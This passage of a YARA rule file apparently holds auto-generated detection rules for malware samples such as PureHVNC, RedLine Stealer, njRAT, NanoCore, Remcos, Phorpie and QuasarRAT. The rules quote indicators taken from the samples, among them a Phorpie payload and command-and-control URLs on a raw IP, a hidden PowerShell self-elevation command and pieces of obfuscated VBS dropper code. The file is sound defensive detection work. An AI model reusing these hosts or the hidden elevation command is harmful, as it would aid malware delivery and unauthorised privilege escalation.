      hash1 = "4a0ebe8b1cdf58a309fe4ff1524565ea0097b096ec45e93b1f7dc7403ee13fe6"
   strings:
      $s1 = "SKZG_k8045SGECMUG0HS.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s6 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s9 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s10 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s12 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s13 = "NMve:\\" fullword ascii /* score: '10.00'*/
      $s14 = "c:\\min" fullword ascii /* score: '10.00'*/
      $s15 = "logsta" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__545b97f1 {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_545b97f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "545b97f1a96a0c53a357c1fc49cb2c22635b63278aa048558cdbbf473c1a0a40"
   strings:
      $s1 = "Pdh4m_f820Xs_chwaDZC.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s6 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s9 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s10 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s12 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s13 = "c:\\min" fullword ascii /* score: '10.00'*/
      $s14 = "FTOQf4.Fyx" fullword ascii /* score: '10.00'*/
      $s15 = "i%w:\"_DW" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__65d7c6ec {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_65d7c6ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "65d7c6ec2d06af661a4f712bea2166b7178920b4ff03af00aa50fd4a9db9822a"
   strings:
      $s1 = "GML_R8024602WQLJGHRC.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s4 = "d3RCcHUj#" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s6 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s7 = "* gCdBLX7" fullword ascii /* score: '12.00'*/
      $s8 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s9 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s10 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s11 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s14 = "xphHwOppspy" fullword ascii /* score: '9.00'*/
      $s15 = "* PSg^6v" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__a6e3eb6f {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_a6e3eb6f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6e3eb6f0c3bae3493ede67dd84ccfca2f464700c107752d4f4a7e6f9a063e4c"
   strings:
      $s1 = "dumpsta" fullword ascii /* score: '18.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "MDH0GY3W0R_F8002D_EY.exe" fullword wide /* score: '16.00'*/
      $s4 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s5 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s6 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s7 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s8 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s9 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s10 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s14 = "C:\\Ddi" fullword ascii /* score: '10.00'*/
      $s15 = "[K%u:\\]" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__a6eb3c0c {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_a6eb3c0c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6eb3c0c7b03495a6bbf7a742e1e7a1f9af8b1d02018397b223b27643c760a7b"
   strings:
      $s1 = "KCE0HUS2R5WYHIL9ZQM.exe" fullword wide /* score: '22.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s6 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s9 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s10 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s12 = "JuPv:\\" fullword ascii /* score: '10.00'*/
      $s13 = "getwls" fullword ascii /* score: '10.00'*/
      $s14 = "ewirCTx" fullword ascii /* score: '9.00'*/
      $s15 = "* ]dUB" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule RedLineStealer_signature__5cdfba68edbb115e7aa5ed6776bb6546_imphash_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_5cdfba68edbb115e7aa5ed6776bb6546(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c2d90f19277c1d5a5adfcfeeee016fe17da95923a81f82585d6ea26ec3d4b2d"
   strings:
      $s1 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s2 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s3 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>" fullword ascii /* score: '17.00'*/
      $s4 = "<longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '17.00'*/
      $s5 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii /* score: '16.00'*/
      $s6 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s7 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii /* score: '16.00'*/
      $s8 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii /* score: '16.00'*/
      $s9 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s10 = "Lhttp://pki-crl.symauth.com/ca_d409a5cb737dc0768fd08ed5256f3633/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s11 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s12 = "/dumpsta" fullword ascii /* score: '14.00'*/
      $s13 = "http://ocsp.digicert.com0X" fullword ascii /* score: '14.00'*/
      $s14 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s15 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule RedLineStealer_signature__5cdfba68edbb115e7aa5ed6776bb6546_imphash__e81f308f {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_5cdfba68edbb115e7aa5ed6776bb6546(imphash)_e81f308f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e81f308fd10eb18af80b2de4ff5c36ae3d5e4be772269b37b27e23634dd00008"
   strings:
      $s1 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s2 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s3 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s4 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s5 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>" fullword ascii /* score: '17.00'*/
      $s6 = "<longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '17.00'*/
      $s7 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s8 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s9 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s10 = "Lhttp://pki-crl.symauth.com/ca_d409a5cb737dc0768fd08ed5256f3633/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s11 = "9http://crl.sectigo.com/SectigoPublicTimeStampingCAR36.crl0z" fullword ascii /* score: '16.00'*/
      $s12 = "9http://crt.sectigo.com/SectigoPublicTimeStampingCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s13 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl05" fullword ascii /* score: '16.00'*/
      $s14 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s15 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__087d88e3 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_087d88e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "087d88e3175f91f7e9faa287f4c891b367677f61bccfbaf8b75b7e5825e84aab"
   strings:
      $s1 = "TGHc.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s3 = "tempora" fullword wide /* score: '15.00'*/
      $s4 = "TGHc.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "quaerat" fullword wide /* score: '13.00'*/
      $s6 = "commodo" fullword wide /* score: '11.00'*/
      $s7 = "deserunt" fullword wide /* score: '11.00'*/
      $s8 = "commodi" fullword wide /* score: '11.00'*/
      $s9 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s10 = "\\]725\"+B" fullword ascii /* score: '10.00'*/ /* hex encoded string 'r[' */
      $s11 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s12 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s13 = "consectetur" fullword wide /* score: '8.00'*/
      $s14 = "adipiscing" fullword wide /* score: '8.00'*/
      $s15 = "eiusmod" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule njrat_signature__f4639a0b3116c2cfc71144b88a929cfd_imphash_ {
   meta:
      description = "_subset_batch - file njrat(signature)_f4639a0b3116c2cfc71144b88a929cfd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d56202b326d49ee41b712c7f61305fe4a811c5415dac201eb989230c6442eb8d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "drillhole udhngets.exe" fullword wide /* score: '24.00'*/
      $s5 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s6 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s7 = "nstall System v3.10</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s9 = "suber bortlednings contentness" fullword wide /* score: '11.00'*/
      $s10 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s11 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule NanoCore_signature_ {
   meta:
      description = "_subset_batch - file NanoCore(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bdd657a4d1e7c77a3ecb7a1d62ad4feb8d5562a6eb29470837262465cca0a234"
   strings:
      $x1 = "FnGoOGNHRden = FnGoOGNHRden & \"UEsDBBQAAAgAAEUetVCFbDmKLgAAAC4AAAAIAAAAbWltZXR5cGVhcHBsaWNhdGlvbi92bmQub2FzaXMub3BlbmRvY3VtZW50" ascii /* score: '37.00'*/
      $x2 = "gwiXIDlkxZbRHlqRYXgMflyB = gwiXIDlkxZbRHlqRYXgMflyB & \"eTl5VVU0emFqRk9hSEJGZFVScVJ6QjJhbG8yTURGNGJIZzRWV0kzWWpOellXOXdNMVpFUVdW" ascii /* score: '37.00'*/
      $s3 = "gwiXIDlkxZbRHlqRYXgMflyB = gwiXIDlkxZbRHlqRYXgMflyB & \"b24gZXJyb3IgcmVzdW1lIG5leHQNCkRpbSBhSlRZbHNlVUhCRlBWd01YSmJyT1pJbWZPVlJT" ascii /* score: '27.00'*/
      $s4 = "FJGTjRjM1JrVGxWWmEyeHRXaXRGZWxWbFJVUmxUMGhTUVRKSGFWYzNPWGg0VEZsbVdIcFFRMDAwYmxadk5tWkpaSGhuZG1GM1VYSkpielJJTmpOb2QyZFpMM2d3WlUxe" ascii /* score: '19.00'*/
      $s5 = "kdJdllwWW5pTml2c2hYDQonaXJCWkJYbXRuTmp4YmdPdHdER2h0SG1WR21Lc1pYZXdjY2dyd0FFQk5NVWlvcnhIVFRsc2x6ZGFGZ1NQTnVVUWltVnl6WHh3eUVVZ21FZ" ascii /* score: '19.00'*/
      $s6 = "mRVWFRuYW5hRlRTQnZtT1JxRWJ4a1NhUlogPSAgQ3JlYXRlT2JqZWN0KCBDaHJXKDI4MSs4My0yODEpICYgQ2hyVygxODMrOTktMTgzKSAmIENoclcoMTIxKzExNC0xM" ascii /* score: '19.00'*/
      $s7 = "HCG8QHxwf1xU2dO/fzs7qsi4oq5k7AqZQkIsoKw2wwEQDJnnP+b1HwyAdI0tt+9e6e5HhdvuEhRxcMbF1nmnTo5meAF9piPEaXp1cpNh9L3ZtI39axUl2pRTRWuGqW2C" ascii /* score: '17.00'*/
      $s8 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAAAAAB" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAF" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s13 = "FlWRlRRbTFJTW1sSFEyeHBkVVJ6UTI5dFNuRm5Nbk5MZW10SmNtdE1TRWw1Wm01b2JVbERha0ZxYkdSdk5tVmFVa0ZSU2pkNmEwSnJjbm80TVdJeGVsZ3dNRFpKZVZke" ascii /* score: '16.00'*/
      $s14 = "lFVSkJUM2xhWjNkYU5FRlJRVUZCUVVOQlFVSkZaMDlLY1UxQ2JtdENWazFOUVVGQlFVRkJVV280YlhBd1FtWjNSamgzZDBGQlFVRkJRa05EVTJKYWQwTkJRVkZCUVVGQ" ascii /* score: '16.00'*/
      $s15 = "4KCnkkFQSkqaIjKV6W2cEdFU6VpooJfGZTV1mwGkio45DPSHas4q1/lXFeffoIlKAGiKFx7pOKRKgVp+vJVz/CgETUfJqLKrVEorracUcNxp/LtIkraqcerkkJeh55YQ" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6e6f and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__11edfa83 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_11edfa83.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "11edfa83b2ca5bc3601a73f30bbbddee9b18c91640d6a809704ba86c12bd1517"
   strings:
      $s1 = "Execute \"Respirerendes.\" + Overvintring + \"Exe\" & chr(99) & \"ute Sleek,Unencumbering,Nonimmunizeds,Neuriatry ,Desorption\"" fullword ascii /* score: '22.00'*/
      $s2 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s3 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s4 = "Perioderegnskaberne = Perioderegnskaberne + \" ] QQQ:\"" fullword ascii /* score: '14.00'*/
      $s5 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s6 = "Perioderegnskaberne = Perioderegnskaberne + \"h:hhhh:\"" fullword ascii /* score: '14.00'*/
      $s7 = "Perioderegnskaberne = Perioderegnskaberne + \"KKLKKKK:\"" fullword ascii /* score: '14.00'*/
      $s8 = "Perioderegnskaberne = Perioderegnskaberne + \"!!!L!!!!E\"" fullword ascii /* score: '13.00'*/
      $s9 = "Perioderegnskaberne = Perioderegnskaberne + \"!L!!!!o!! !A\"" fullword ascii /* score: '13.00'*/
      $s10 = "Perioderegnskaberne = Perioderegnskaberne + \"ldllll\"" fullword ascii /* score: '13.00'*/
      $s11 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s12 = "Perioderegnskaberne = Perioderegnskaberne + \"Get-\"" fullword ascii /* score: '13.00'*/
      $s13 = "Perioderegnskaberne = Perioderegnskaberne + \"!!!f !!!i \"" fullword ascii /* score: '13.00'*/
      $s14 = "Perioderegnskaberne = Perioderegnskaberne + \" !!!d!\"" fullword ascii /* score: '13.00'*/
      $s15 = "Curculionidaejockeyern = MidB(\"Afvigende\", 15, 228)" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 200KB and
      8 of them
}

rule Phorpie_signature__50fb6918a305a90db619399ab328d4f3_imphash_ {
   meta:
      description = "_subset_batch - file Phorpie(signature)_50fb6918a305a90db619399ab328d4f3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a79a39c9e310d322395ed90808899ade754a8732ac2d86a747d6a01761cee186"
   strings:
      $s1 = "http://178.16.54.109/lbitch.exe" fullword wide /* score: '27.00'*/
      $s2 = "dwinsvc.exe" fullword wide /* score: '22.00'*/
      $s3 = "pnql.dll not found!" fullword ascii /* score: '19.00'*/
      $s4 = "%s\\%d%d.exe" fullword wide /* score: '19.00'*/
      $s5 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s6 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s7 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s8 = "http://178.16.54.109/preload.php" fullword ascii /* score: '15.00'*/
      $s9 = "http://178.16.54.109/got.php?s=%s" fullword wide /* score: '15.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" fullword wide /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" fullword wide /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" fullword wide /* score: '9.00'*/
      $s13 = "hostname: %s" fullword wide /* score: '9.00'*/
      $s14 = "freeukraine" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      8 of them
}

rule PureLogsStealer_signature__27f7bd25c38f9464ed5d43a183116ed5_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_27f7bd25c38f9464ed5d43a183116ed5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "65039817a944e3adf00f0111c57c11f659b32ed8938a96a9fe533eabbf039559"
   strings:
      $s1 = "\\app.exe" fullword ascii /* score: '13.00'*/
      $s2 = "\\MyApp.lnk" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule QuasarRAT_signature__4212d684ac905b1d94ca771b4bd8f7e2_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_4212d684ac905b1d94ca771b4bd8f7e2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3662a8d4f950c9ebd0851e0b0713f2e48dfb7dd5ac3de02bae8acd1d6c4efd1d"
   strings:
      $x1 = "powershell.exe -WindowStyle Hidden -Command \"Start-Process '%s' -Verb RunAs -WindowStyle Hidden\"" fullword ascii /* score: '46.00'*/
      $s2 = "SecurityHealthService.exe" fullword ascii /* score: '25.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "%s%s%d.exe" fullword ascii /* score: '20.00'*/
      $s5 = "D$<.dll" fullword ascii /* score: '17.00'*/
      $s6 = "SystemService516" fullword ascii /* score: '11.00'*/
      $s7 = "SYSTEM\\CurrentControlSet\\Services\\VBoxService" fullword ascii /* score: '10.00'*/
      $s8 = "SYSTEM\\CurrentControlSet\\Services\\VMTools" fullword ascii /* score: '10.00'*/
      $s9 = "jOep:\"" fullword ascii /* score: '10.00'*/
      $s10 = "SmAB -\\" fullword ascii /* score: '8.00'*/
      $s11 = "ServiceMain572" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule RedLineStealer_signature__11bec5145a2f1c138e9625f5bb42a8cc_imphash_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_11bec5145a2f1c138e9625f5bb42a8cc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ffbc6b4d798a9755203d14efb72bc64c34c92cd759083561b6f6e8064bb1eff0"
   strings:
      $x1 = "C:\\Windows\\SysWOW64\\dllhost.exe" fullword ascii /* score: '31.00'*/
      $s2 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s3 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s4 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s5 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\iterator.rs" fullword ascii /* score: '24.00'*/
      $s6 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\impls.rs" fullword ascii /* score: '24.00'*/
      $s7 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\exact_size.rs" fullword ascii /* score: '24.00'*/
      $s8 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\cursor.rs" fullword ascii /* score: '24.00'*/
